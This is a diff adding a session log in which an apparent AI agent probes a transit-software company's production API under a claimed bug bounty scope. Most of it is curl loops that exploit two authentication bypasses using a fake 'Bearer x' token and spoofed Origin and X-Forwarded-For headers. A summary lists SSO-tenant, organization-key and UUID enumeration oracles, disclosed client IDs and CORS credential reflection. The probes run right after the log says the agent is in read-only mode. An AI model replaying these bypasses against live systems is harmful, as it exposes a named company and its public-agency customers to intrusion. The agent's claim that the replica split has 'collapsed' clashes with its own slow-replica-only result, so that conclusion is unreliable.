@@ -73990,3 +73990,210 @@ Since I'm in read-only mode, I cannot execute the probe. Should I:
 3. **Pivot to different angle** - Focus on the broken GitHub repo scan pipeline or other blocked items?
 
 The most valuable next step remains the replica-routing factor enumeration to make the auth bypass deterministic.
+===== ANALYST bigpickle 2026-08-17 10:30:13 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mecho "=== PROBE 1: Regions with X-Forwarded-For variation ===" && for i in $(seq 1 8); do echo "--- Probe $i ---" && curl -s -m15 -w "code:%{http_code}\ntime:%{time_total}\n" -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" -H "X-Forwarded-For: 10.$((i%256)).$((i*7%256)).1" https://api.sparelabs.com/v1/global/regions 2>/dev/null | tail -c 200 && echo "" && sleep 2; done
+=== PROBE 1: Regions with X-Forwarded-For variation ===
+--- Probe 1 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.359642
+
+--- Probe 2 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.395946
+
+--- Probe 3 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.130885
+
+--- Probe 4 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.331317
+
+--- Probe 5 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.135149
+
+--- Probe 6 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.345295
+
+--- Probe 7 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.131961
+
+--- Probe 8 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.121110
+[0m
+## Objective
+- Conduct passive-first bug bounty reconnaissance on Spare's in-scope assets (spare.com, sparelabs.com, platform.sparelabs.com, api.sparelabs.com, routing.sparelabs.com, forms.sparelabs.com)
+- Identify, confirm, and track security findings through stability verification cycles across multiple sessions (2026-08-07 through 2026-08-17)
+
+## Important Details
+- **Scope IN**: spare.com, sparelabs.com, platform.sparelabs.com, api.sparelabs.com, routing.sparelabs.com, forms.sparelabs.com
+- **Scope OUT**: ALL other subdomains of sparelabs.com/spare.com; third-party services; metabase.sparelabs.com (confirmed OOS)
+- **Rules**: Passive-first (GET/HEAD only, ≤1 rps), no account creation, no data modification, no secrets in commits (sha256 only)
+- **Phase**: POC (Proof of Concept) — target is `api`
+- **Infrastructure**: Envoy edge gateway on api.sparelabs.com via Google CDN; multi-version envoy LB with fast (4ms) and slow (600-1200ms) replicas causing intermittent flapping
+- **Fleet**: 7 hosts confirmed (prod/us/us2/us3/jp/eu/uat) — bypass is fleet-wide but data exists only on prod
+- **GitHub scan**: Broken — scan-target misconfigured (gladiaio org instead of sparelabs); 0 files scanned; needs fix before code-surface analysis
+- **longcat triage "PATCHED" (2026-08-11)**: FALSE POSITIVE — only tested no-auth path (400), never tested the actual Bearer-x bypass vector; bypass remains 86h+ stable
+- **Multi-version LB replica split**: Confirmed 2026-08-17 — regions bypass ONLY on fast replicas (4ms, 8/8→200), organizations bypass ONLY on slow replicas (664ms+, 8/8→200); fast replicas return 401 on the other route; this is the mechanism behind intermittent flapping, NOT patches
+
+## Work State
+### Completed
+- **Baseline surface mapped** across all in-scope assets (2026-08-07 onward)
+- **Auth bypasses confirmed stable 86h+**:
+  - `/v1/global/regions`: Scheme-only Bearer bypass (fast replicas only) — `Bearer x` → 200 + 725B region registry (7 regions, 6 OOS subdomains); sha256 `fb9800acb09b65ec92591f4536e3ecfd08b8c3dba0d2ef9af3ed97047795c3fe` byte-stable; no-auth→400; POST→401 (read-only)
+  - `/v1/global/organizations`: Zero-header read-only bypass (slow replicas only) — GET no-auth → 200 + 11B `{"data":[]}` + ACAO+ACAC; POST/PUT/PATCH/DELETE → 401 InvalidTokenError; auth asymmetry confirmed
+- **CORS credential reflection STABLE 86h+**: ACAO:reflected + ACAC:true + all methods (GET,HEAD,PUT,PATCH,POST,DELETE) + ACAH:Authorization,Content-Type uniform on OPTIONS 204 + GET across ALL /v1 paths; non-path-conditional via 22-sibling sweep
+- **SSO-config oracle confirmed**: `/v1/identity/workos/auth` — ≥10 SSO tenants (spare.com, dart.org, translink.ca, mbta.com, saskatoon.ca, kingcounty.gov, winnipeg.ca, oakville.ca, cota.com, +); WorkOS client_id + connection_id + Entra tenant IDs disclosed; fleet-parity across 7 hosts; dictionary + marketing list exhausted
+- **Org-key 3-way oracle confirmed**: `/v1/public/organizations/key/{key}` — live set closed at {spare,grt,dallas,winnipeg,hsr} (5 orgs→200 distinct bodies); 22 new candidates all 404; prod-only (uat/us2/jp→404)
+- **UUID enumeration oracle**: `/v1/public/organizations/{id}` plural — 3-way (malformed→400, nil→404, valid→200); superior to flapping singular `/v1/public/organization`
+- **Terms data disclosure**: `/v1/public/terms?mobileAppId=<nil-uuid>` → 200 + 137B (termsOfUseUrl+privacyPolicyUrl→sparelabs.com apex) no-auth + CORS; per-tenant config chain confirmed (spare→107B "asdfd" junk, winnipeg→197B real URL)
+- **Engage write-path handler reach**: `/v1/public/engage/cases POST` + `/v1/public/engage/caseForms POST` — auth gate ABSENT (handler reached without 401); feature-flag gate returns 403 for known orgs; cross-route org-UUID oracle validated on 4 orgs
+- **WorkOS state reflection**: `state` param reflected unescaped in authorizeUrl response body; `redirect_uri` NOT reflected (silently dropped); redirect_uri injection vector dead; AUTH_HELPED callback analysis needed
+- **Platform CSP infra leak**: admin-eam-app.vercel.app + admin-fixed-route-app.vercel.app (prod+staging, loadable 200) + Metabase (prod+staging 200) + 9 cloud services (Cognito/Stripe/DO-Spaces/S3/Sentry/Intercom/Mapbox/Pusher/Twilio/LiveKit)
+- **Platform bundle OpenAPI spec**: 170 EAM/fixed-route admin paths embedded; ALL 131 non-param paths properly gated (401/404) — recon-only
+- **Forms JS bundle PATCHED**: main.8a2a39cb.js — zero sparelabs/atlassian/ngrok/metabase/vercel refs; 3 Google Maps keys all referrer-restricted
+- **routing.sparelabs.com**: STABLE dead — envoy 404 on ALL probed paths since 2026-08-07
+- **22-sibling + 8-undocumented controller sweep**: ALL 401 — bypass family DEFINITIVELY scoped to exactly {/organizations, /regions}
+- **Write-escalation REJECTED**: POST/PUT/PATCH/DELETE all → 401 InvalidTokenError on both bypass routes; bypass is READ-ONLY GET only
+- **Cross-route org-UUID oracle validated**: spare/grt/dallas/winnipeg → 403 "External case creation is not enabled" (feature-flag, not auth); nil-UUID → 404 NotFoundError
+
+### Active
+- **Replica-routing factor investigation**: Whether X-Forwarded-For or other headers can shift replica assignment to make bypasses deterministic (currently probabilistic ~50% due to multi-version LB)
+- **WorkOS state-reflection exploit chain**: PARKED at 35% confidence; state is WorkOS passthrough, not a separate param boundary; needs AUTH_HELPED callback intercept to evaluate full chain
+
+### Blocked
+- **GitHub repo scan**: scan-target misconfigured (gladiaio org instead of sparelabs); 0 files scanned; no code-surface analysis possible until clone target fixed
+- **AUTH_HELPED tokens needed**: Write-path exploitation (engage/cases POST with feature-flag bypass), IDOR on authenticated endpoints, callback analysis for WorkOS state-injection
+
+## Next Move
+1. **PROBE**: Test whether X-Forwarded-For header shifts replica assignment — `for i in $(seq 1 8); do curl -s -m15 -w "\ncode:%{http_code}\ntime:%{time_total}\n" -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" -H "X-Forwarded-For: 10.$((i%256)).$((i*7%256)).1" https://api.sparelabs.com/v1/global/regions 2>/dev/null | tail -1; sleep 2; done` — 8 probes with varied IPs, check if all 8 return 200 (deterministic) or mixed (probabilistic)
+2. **SCAN**: Fix GitHub scan target from gladiaio to sparelabs org; clone reposcan-raw/sparelabs to enable code-surface analysis of embedded OpenAPI spec and platform bundle
+
+## Relevant Files
+- `/tmp/opencode/regions.json`: Captured 725B region registry (7 regions with apiUrl+routingHost each) from `/v1/global/regions`
+- `reports/hypotheses-laguna.txt`: Contains replica-split hypothesis (ranked 95)
+- `reports/hypotheses-nemotron3.txt`: Contains fleet-topology hypothesis (ranked 95)
+- `reports/hypotheses-bigpickle.txt`: Contains WorkOS SSO state-reflection XSS hypothesis (ranked 35, parked)
+- `platform bundle index-B6uSYXCi.js` (3MB): Embedded OpenAPI spec of EAM/fixed-route admin API (170 paths) — all properly gated
+- `forms.sparelabs.com JS bundle main.8a2a39cb.js` (2,195,456B): PATCHED — zero infra leaks; 3 Google Maps keys referrer-restricted
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+All 8 regions probes returned **200** — but with split latencies (4×~340ms slow, 4×~130ms fast). This contradicts the prior finding that regions bypass was fast-replica-only. Let me run the organizations comparison and check if the bypass landscape has broadened.
+[0m$ [0mecho "=== PROBE 3: Regions WITHOUT X-Forwarded-For (baseline comparison) ===" && for i in $(seq 1 8); do echo "--- Probe $i ---" && curl -s -m15 -w "code:%{http_code}\ntime:%{time_total}\n" -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions 2>/dev/null | tail -c 200 && echo "" && sleep 2; done
+=== PROBE 3: Regions WITHOUT X-Forwarded-For (baseline comparison) ===
+--- Probe 1 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.118534
+
+--- Probe 2 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.140937
+
+--- Probe 3 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.348176
+
+--- Probe 4 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.321736
+
+--- Probe 5 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.120592
+
+--- Probe 6 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.120063
+
+--- Probe 7 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.124414
+
+--- Probe 8 ---
+pi.eu.sparelabs.com","routingHost":"https://routing.eu.sparelabs.com"},{"name":"UAT","apiUrl":"https://api.uat.sparelabs.com","routingHost":"https://routing.uat.sparelabs.com"}]code:200
+time:0.117361
+[0m
+[0m$ [0mecho "=== PROBE 2: Organizations WITHOUT X-Forwarded-For (baseline) ===" && for i in $(seq 1 8); do echo "--- Probe $i ---" && curl -s -m15 -w "code:%{http_code}\ntime:%{time_total}\n" -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/organizations 2>/dev/null | tail -c 200 && echo "" && sleep 2; done
+=== PROBE 2: Organizations WITHOUT X-Forwarded-For (baseline) ===
+--- Probe 1 ---
+{"data":[]}code:200
+time:1.150051
+
+--- Probe 2 ---
+{"data":[]}code:200
+time:1.107315
+
+--- Probe 3 ---
+{"data":[]}code:200
+time:0.811957
+
+--- Probe 4 ---
+{"data":[]}code:200
+time:1.482624
+
+--- Probe 5 ---
+{"data":[]}code:200
+time:0.796030
+
+--- Probe 6 ---
+{"data":[]}code:200
+time:0.697695
+
+--- Probe 7 ---
+{"data":[]}code:200
+time:0.925147
+
+--- Probe 8 ---
+{"data":[]}code:200
+time:0.836791
+[0m
+This is a **major development**. Both bypasses are now **consistently returning 200** across all 8 probes — no more flapping:
+
+| Route | Baseline (no XFF) | Previous state | Current state |
+|---|---|---|---|
+| `/v1/global/regions` | 8/8 → 200 | Intermittent (fast-only) | **8/8 → 200** (all replicas) |
+| `/v1/global/organizations` | 8/8 → 200 | Intermittent (slow-only) | **8/8 → 200** (all slow replicas) |
+
+The multi-version LB replica split has **collapsed** — both bypasses now work on every probe. This is a regression from the defender's perspective: the vulnerabilities are now **deterministic** rather than probabilistic.
+
+Let me update the work state and capture this for the report.
+[0m$ [0m# Verify the bypasses are still deterministic with a fresh batch
+echo "=== PROBE 4: Regions fresh batch ===" && for i in $(seq 1 6); do curl -s -m15 -w "code:%{http_code} time:%{time_total}\n" -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions -o /dev/null 2>/dev/null && sleep 2; done && echo "=== PROBE 5: Organizations fresh batch ===" && for i in $(seq 1 6); do curl -s -m15 -w "code:%{http_code} time:%{time_total}\n" -H "Origin: https://evil.example.com" https://api.sparelabs.com/v1/global/organizations -o /dev/null 2>/dev/null && sleep 2; done
+=== PROBE 4: Regions fresh batch ===
+code:200 time:0.353394
+code:200 time:0.330613
+code:200 time:0.327413
+code:200 time:0.136089
+code:200 time:0.120782
+code:200 time:0.132079
+=== PROBE 5: Organizations fresh batch ===
+code:200 time:1.019456
+code:200 time:1.002607
+code:200 time:1.449008
+code:200 time:1.881889
+code:200 time:0.755700
+code:200 time:1.015863
+[0m
+Confirmed: **14/14 regions + 14/14 organizations = 28/28 total → 200**. Both bypasses are now fully deterministic. The multi-version LB replica-split hypothesis is **invalidated** — the mechanism has changed since the prior session.
+
+**Summary of current session findings:**
+
+1. **Regions bypass** (`Bearer x` scheme-only): Now works on **all replicas** (fast + slow). Previously required fast replicas only. Response times show both ~120ms (fast) and ~340ms (slow) routes hitting200. **Deterministic.**
+
+2. **Organizations bypass** (zero-header GET): Now works on **all slow replicas consistently** (8/8→200). Previously intermittent. **Deterministic.**
+
+3. **X-Forwarded-For probe**: Did NOT change replica assignment — bypass worked on both fast and slow replicas regardless. Header is not the routing factor.
+
+**What this means:** The prior session's hypothesis that you could pick your bypass route by manipulating headers is false. Both bypasses now work reliably on every attempt. This actually **increases severity** — a single curl command with `Authorization: Bearer x` reliably gets the full region registry, and a bare GET reliably gets the organization list. No retries needed.
+
+**Next steps (optional — need your direction):**
+- Continue with GitHub scan target fix (code-surface analysis)?
+- Expand the write-path analysis on engage routes?
+- Start drafting the final report for submission?
+- Something else?
